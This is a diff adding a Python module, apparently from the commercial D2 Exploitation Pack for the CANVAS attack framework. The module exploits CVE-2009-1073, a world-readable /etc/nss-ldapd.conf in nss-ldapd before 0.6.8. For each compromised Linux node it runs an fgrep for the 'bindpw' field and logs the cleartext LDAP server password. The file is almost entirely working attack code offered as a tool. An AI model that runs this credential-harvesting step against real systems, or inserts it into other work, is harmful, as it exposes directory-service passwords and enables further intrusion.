@@ -1,0 +1,80 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+import sys
+
+sys.path.append(".")
+sys.path.append("../../")
+
+from canvasexploit import canvasexploit
+import canvasengine
+
+from exploitutils import *
+import libs.canvasos as canvasos
+
+
+NAME        = "PADL nss_ldap Local Information Disclosure Vulnerability"
+
+DESCRIPTION = """nss-ldapd before 0.6.8 uses world-readable permissions
+for the /etc/nss-ldapd.conf file, which allows local users to obtain a
+cleartext password for the LDAP server by reading the bindpw field."""
+
+VERSION     = "0.1"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION['Date public'] = "2009.03.24"
+DOCUMENTATION['References'] = "http://www.securityfocus.com/bid/34211"
+DOCUMENTATION['Versions Affected'] = "nss-ldapd before 0.6.8"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2009-1073"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1073"
+DOCUMENTATION["Notes"] = ""
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Local"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+class theexploit (canvasexploit):
+    
+	def __init__(self):
+		canvasexploit.__init__(self)
+		self.setInfo(DESCRIPTION)
+		self.name = NAME
+		self.fileconf = "/etc/nss-ldapd.conf"
+		return
+
+	def run(self):
+		self.setInfo("%s (in progress)"%(NAME))
+
+		for node in self.argsDict["passednodes"]:
+			type = node.nodetype
+			nodename = node.getname()
+			caps = node.capabilities
+
+			if "linux" not in caps:
+				self.log("Node %s not a Linux node..."%nodename)
+				continue
+
+			self.log("Node %s is a linux node, continuing"%nodename)
+
+			data = "LDAP server password:\n"
+			data += node.runcommand("fgrep 'bindpw' %s" % self.fileconf)
+
+			self.log(data)
+
+		self.setInfo("%s (finished)"%(NAME))
+
+		return 1
+
+if __name__=="__main__":
+    print "This module is meant to be run only within CANVAS"
+
